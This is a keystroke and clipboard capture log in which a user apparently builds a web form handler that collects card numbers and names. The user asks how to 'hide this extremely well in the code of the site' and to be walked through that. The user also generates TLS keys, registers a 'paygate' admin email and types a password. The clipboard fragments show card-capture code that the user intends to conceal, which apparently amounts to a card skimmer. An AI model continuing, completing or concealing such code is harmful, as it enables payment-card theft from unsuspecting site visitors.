+[2026-11-04 23:19:00] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231859.png
+[2026-11-04 23:19:30] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231930.png
+[2026-11-04 23:20:00] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232000.png
+[2026-11-04 23:20:30] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232030.png
+[2026-11-04 23:21:00] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232100.png
+[2026-11-04 23:21:28] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:21:28] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:21:28] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:21:28] INFO: KEY_PRESS: 't'
+[2026-11-04 23:21:28] INFO: KEY_PRESS: 's'
+[2026-11-04 23:21:28] INFO: KEY_SPECIAL: space
+[2026-11-04 23:21:28] INFO: KEY_PRESS: 't'
+[2026-11-04 23:21:28] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:21:28] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:21:28] INFO: KEY_SPECIAL: space
+[2026-11-04 23:21:29] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:21:29] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:21:29] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:21:29] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:21:29] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:21:29] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:21:29] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:21:29] INFO: KEY_PRESS: '?'
+[2026-11-04 23:21:30] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232130.png
+[2026-11-04 23:22:00] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232200.png
+[2026-11-04 23:22:26] INFO: CLIPBOARD_UPDATED: 'if 'submission_data' not in session_data:
+    session_data['submission_data'] = {}'
+[2026-11-04 23:22:30] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232230.png
+[2026-11-04 23:22:40] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:22:40] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:40] INFO: KEY_PRESS: 'j'
+[2026-11-04 23:22:40] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:22:40] INFO: KEY_PRESS: 's'
+[2026-11-04 23:22:40] INFO: KEY_PRESS: 't'
+[2026-11-04 23:22:40] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:41] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:22:41] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:22:41] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:22:41] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:22:41] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:41] INFO: KEY_PRESS: 't'
+[2026-11-04 23:22:41] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:22:41] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:42] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:22:42] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:22:42] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:22:42] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:22:42] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:42] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:22:42] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:22:42] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:22:43] INFO: KEY_PRESS: 't'
+[2026-11-04 23:22:43] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:43] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:22:43] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:22:43] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:43] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:22:43] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:22:44] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:22:44] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:22:45] INFO: KEY_PRESS: 't'
+[2026-11-04 23:22:45] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:22:45] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:45] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:22:45] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:22:45] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:22:45] INFO: KEY_PRESS: 't'
+[2026-11-04 23:22:45] INFO: KEY_SPECIAL: space
+[2026-11-04 23:22:45] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:22:45] INFO: KEY_PRESS: 'x'
+[2026-11-04 23:22:46] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:22:46] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:22:46] INFO: KEY_PRESS: 't'
+[2026-11-04 23:22:46] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:22:46] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:23:00] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232300.png
+[2026-11-04 23:23:29] INFO: CLIPBOARD_UPDATED: '    # 1. Capture User Input (The Keylogger/Clipboard input)
+    card_number = request.form.get('card_number')
+    name = request.form.get('name')
+    # ... other captures ...
+
+    # 3. Update Session Data - PROTECTION LAYER ADDED HERE
+    if 'submission_data' not in session_data:
+        session_data['submission_data'] = {} # <-- THIS IS THE NEW LINE THAT CREATES THE SUB-FOLDER
+
+    session_data['submission_data']['card_number'] = card_number
+    session_data['submission_data']['name'] = name
+    session_data['submission_data']['user_agent'] = user_agent'
+[2026-11-04 23:23:31] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232331.png
+[2026-11-04 23:23:49] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:23:49] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:23:49] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:23:49] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:23:56] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:01] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232401.png
+[2026-11-04 23:24:02] INFO: CLIPBOARD_UPDATED: '    # 3. Update Session Data - PROTECTION LAYER ADDED HERE
+    if 'submission_data' not in session_data:
+        session_data['submission_data'] = {} # <-- THIS IS THE NEW LINE THAT CREATES THE SUB-FOLDER
+
+    session_data['submission_data']['card_number'] = card_number
+    session_data['submission_data']['name'] = name
+    session_data['submission_data']['user_agent'] = user_agent
+'
+[2026-11-04 23:24:11] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:17] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:24:17] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:24:18] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:24:18] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:24:18] INFO: KEY_PRESS: 't'
+[2026-11-04 23:24:19] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:24:19] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:24:19] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:24:19] INFO: KEY_PRESS: '3'
+[2026-11-04 23:24:19] INFO: KEY_SPECIAL: space
+[2026-11-04 23:24:20] INFO: KEY_PRESS: 's'
+[2026-11-04 23:24:20] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:24:20] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:24:20] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:24:20] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:24:20] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:24:20] INFO: KEY_PRESS: '.'
+[2026-11-04 23:24:20] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:24:21] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:24:21] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:24:31] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232431.png
+[2026-11-04 23:24:33] INFO: CLIPBOARD_UPDATED: 'http://127.0.0.1:80'
+[2026-11-04 23:24:37] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:24:37] INFO: KEY_PRESS: 'R'
+[2026-11-04 23:24:37] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:24:37] INFO: KEY_PRESS: 'b'
+[2026-11-04 23:24:37] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:24:37] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:24:38] INFO: KEY_PRESS: 't'
+[2026-11-04 23:24:38] INFO: KEY_SPECIAL: space
+[2026-11-04 23:24:38] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:24:38] INFO: KEY_PRESS: 'M'
+[2026-11-04 23:24:38] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:24:38] INFO: KEY_PRESS: 't'
+[2026-11-04 23:24:39] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:24:39] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:24:39] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:24:39] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:24:39] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:24:39] INFO: KEY_SPECIAL: tab
+[2026-11-04 23:24:40] INFO: KEY_PRESS: '4'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '5'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '5'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '6'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '4'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '4'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '5'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '3'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '5'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '4'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '3'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:24:41] INFO: KEY_PRESS: '4'
+[2026-11-04 23:24:42] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:24:42] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:24:42] INFO: KEY_PRESS: '3'
+[2026-11-04 23:24:42] INFO: KEY_PRESS: '4'
+[2026-11-04 23:24:42] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:24:42] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:45] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:45] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:24:45] INFO: KEY_PRESS: '1'
+[2026-11-04 23:24:45] INFO: KEY_PRESS: '2'
+[2026-11-04 23:24:45] INFO: KEY_PRESS: '3'
+[2026-11-04 23:24:46] INFO: KEY_PRESS: '4'
+[2026-11-04 23:24:46] INFO: KEY_PRESS: '5'
+[2026-11-04 23:24:46] INFO: KEY_PRESS: '6'
+[2026-11-04 23:24:46] INFO: KEY_PRESS: '7'
+[2026-11-04 23:24:46] INFO: KEY_PRESS: '8'
+[2026-11-04 23:24:47] INFO: KEY_PRESS: '9'
+[2026-11-04 23:24:47] INFO: KEY_PRESS: '8'
+[2026-11-04 23:24:47] INFO: KEY_PRESS: '7'
+[2026-11-04 23:24:47] INFO: KEY_PRESS: '6'
+[2026-11-04 23:24:48] INFO: KEY_PRESS: '5'
+[2026-11-04 23:25:01] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232501.png
+[2026-11-04 23:25:31] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232531.png
+[2026-11-04 23:25:33] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:25:33] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:25:33] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:34] INFO: KEY_PRESS: 's'
+[2026-11-04 23:25:34] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:25:34] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:25:34] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:34] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:34] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:25:34] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:25:35] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:25:35] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:35] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:25:35] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:25:35] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:25:35] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:35] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:25:35] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:25:35] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:36] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:25:36] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:36] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:25:36] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:25:36] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:25:36] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:36] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:36] INFO: KEY_PRESS: 't'
+[2026-11-04 23:25:37] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:25:37] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:25:37] INFO: KEY_PRESS: 's'
+[2026-11-04 23:25:37] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:37] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:38] INFO: KEY_PRESS: 'x'
+[2026-11-04 23:25:38] INFO: KEY_PRESS: 't'
+[2026-11-04 23:25:38] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:25:38] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:38] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:25:38] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:25:38] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:25:39] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:39] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:25:39] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:39] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:25:39] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:25:39] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:40] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:25:41] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:25:41] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:41] INFO: KEY_PRESS: 't'
+[2026-11-04 23:25:41] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:25:41] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:41] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:45] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:25:45] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:25:45] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:25:45] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:45] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:45] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:25:46] INFO: KEY_PRESS: 'f'
+[2026-11-04 23:25:46] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:46] INFO: KEY_PRESS: 't'
+[2026-11-04 23:25:46] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:25:46] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:46] INFO: KEY_SPECIAL: space
+[2026-11-04 23:25:46] INFO: KEY_PRESS: 's'
+[2026-11-04 23:25:46] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:25:46] INFO: KEY_PRESS: 't'
+[2026-11-04 23:25:46] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:25:47] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:25:47] INFO: KEY_PRESS: '?'
+[2026-11-04 23:26:01] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232601.png
+[2026-11-04 23:26:31] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232631.png
+[2026-11-04 23:27:01] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232701.png
+[2026-11-04 23:27:21] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:27:21] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:27:21] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:27:21] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:27:21] INFO: KEY_SPECIAL: space
+[2026-11-04 23:27:22] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:27:22] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:27:22] INFO: KEY_PRESS: 't'
+[2026-11-04 23:27:22] INFO: KEY_PRESS: 's'
+[2026-11-04 23:27:22] INFO: KEY_SPECIAL: space
+[2026-11-04 23:27:22] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:27:22] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:27:22] INFO: KEY_SPECIAL: space
+[2026-11-04 23:27:23] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:27:23] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:27:23] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:27:23] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:27:23] INFO: KEY_SPECIAL: space
+[2026-11-04 23:27:23] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:27:23] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:27:23] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:27:23] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:27:24] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:27:24] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:27:24] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:27:24] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:27:24] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:27:24] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:27:24] INFO: KEY_PRESS: 't'
+[2026-11-04 23:27:24] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:27:25] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:27:25] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:27:25] INFO: KEY_PRESS: '.'
+[2026-11-04 23:27:25] INFO: KEY_SPECIAL: space
+[2026-11-04 23:27:25] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:27:25] INFO: KEY_PRESS: 'W'
+[2026-11-04 23:27:25] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:27:26] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:27:26] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:27:26] INFO: KEY_SPECIAL: space
+[2026-11-04 23:27:26] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:27:26] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:27:26] INFO: KEY_SPECIAL: space
+[2026-11-04 23:27:26] INFO: KEY_PRESS: 't'
+[2026-11-04 23:27:26] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:27:26] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:27:27] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:27:27] INFO: KEY_SPECIAL: space
+[2026-11-04 23:27:27] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:27:27] INFO: KEY_PRESS: 't'
+[2026-11-04 23:27:31] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232731.png
+[2026-11-04 23:28:02] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232802.png
+[2026-11-04 23:28:32] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232832.png
+[2026-11-04 23:28:37] INFO: CLIPBOARD_UPDATED: 'openssl genrsa -out key.pem 2048'
+[2026-11-04 23:28:41] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:28:41] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:28:42] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:28:42] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:28:42] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:28:56] INFO: CLIPBOARD_UPDATED: 'openssl req -new -key key.pem -out csr.csr'
+[2026-11-04 23:29:00] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:29:00] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:29:00] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:29:02] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232902.png
+[2026-11-04 23:29:07] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:29:07] INFO: KEY_PRESS: 'C'
+[2026-11-04 23:29:07] INFO: KEY_PRESS: 'A'
+[2026-11-04 23:29:07] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:29:10] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:29:10] INFO: KEY_PRESS: 'B'
+[2026-11-04 23:29:10] INFO: KEY_PRESS: 'C'
+[2026-11-04 23:29:11] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:29:13] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:29:13] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:29:13] INFO: KEY_PRESS: 't'
+[2026-11-04 23:29:13] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:29:13] INFO: KEY_PRESS: 's'
+[2026-11-04 23:29:13] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:29:13] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:29:14] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:29:14] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:29:15] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:29:15] INFO: KEY_SPECIAL: space
+[2026-11-04 23:29:16] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:29:16] INFO: KEY_PRESS: 'C'
+[2026-11-04 23:29:17] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:29:17] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:29:17] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:29:17] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:29:18] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:29:18] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:29:18] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:29:19] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:29:19] INFO: KEY_PRESS: 'b'
+[2026-11-04 23:29:19] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:29:19] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:29:20] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:29:22] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:29:22] INFO: KEY_PRESS: 'V'
+[2026-11-04 23:29:22] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:29:22] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:29:23] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:29:23] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:29:23] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:29:23] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:29:23] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:29:23] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:29:24] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:29:28] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:29:28] INFO: KEY_PRESS: 'K'
+[2026-11-04 23:29:29] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:29:29] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:29:29] INFO: KEY_PRESS: 's'
+[2026-11-04 23:29:30] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:29:32] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_232932.png
+[2026-11-04 23:29:34] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:29:34] INFO: KEY_PRESS: 'S'
+[2026-11-04 23:29:34] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:29:34] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:29:35] INFO: KEY_PRESS: 't'
+[2026-11-04 23:29:35] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:29:35] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:29:35] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:29:35] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:29:40] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:29:40] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:29:41] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:29:41] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:29:42] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:29:42] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:29:47] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:29:47] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:29:47] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:29:47] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:29:49] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:29:49] INFO: KEY_PRESS: '-'
+[2026-11-04 23:29:50] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:29:50] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:29:50] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:29:50] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:29:50] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:29:50] INFO: KEY_PRESS: 't'
+[2026-11-04 23:29:50] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:29:51] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:29:51] INFO: KEY_PRESS: '@'
+[2026-11-04 23:29:51] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:29:51] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:29:51] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:29:52] INFO: KEY_PRESS: 't'
+[2026-11-04 23:29:52] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:29:52] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:29:52] INFO: KEY_PRESS: '.'
+[2026-11-04 23:29:52] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:29:52] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:29:53] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:29:59] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:29:59] INFO: KEY_PRESS: 'T'
+[2026-11-04 23:30:00] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:30:00] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:30:00] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:30:00] INFO: KEY_PRESS: 't'
+[2026-11-04 23:30:00] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:30:00] INFO: KEY_PRESS: '2'
+[2026-11-04 23:30:01] INFO: KEY_PRESS: '0'
+[2026-11-04 23:30:01] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:30:01] INFO: KEY_PRESS: '$'
+[2026-11-04 23:30:01] INFO: KEY_PRESS: '$'
